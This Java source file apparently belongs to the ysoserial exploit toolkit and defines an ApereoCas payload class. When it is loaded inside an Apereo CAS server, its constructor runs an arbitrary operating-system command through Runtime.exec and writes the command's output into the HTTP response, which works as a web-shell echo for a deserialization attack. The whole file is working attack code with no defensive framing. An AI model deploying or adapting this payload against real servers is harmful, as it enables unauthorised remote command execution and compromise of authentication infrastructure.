package ysoserial.exploit;

import org.springframework.webflow.context.ExternalContext;
import org.springframework.webflow.context.ExternalContextHolder;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ApereoCas {
    public ApereoCas(String command) throws IOException{
        ExternalContext externalContext = ExternalContextHolder.getExternalContext();
        Object response = externalContext.getNativeResponse();

        HttpServletResponse httpServletResponse = (HttpServletResponse) response;
        Process proc = Runtime.getRuntime().exec(command);
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        StringBuffer stringBuffer = new StringBuffer();
        String line;
        while((line = bufferedReader.readLine()) != null){
            stringBuffer.append(line).append("\n");
        }
        String result = stringBuffer.toString();
        ServletOutputStream servletOutputStream = httpServletResponse.getOutputStream();
        servletOutputStream.write(result.getBytes());
        servletOutputStream.close();
    }
}
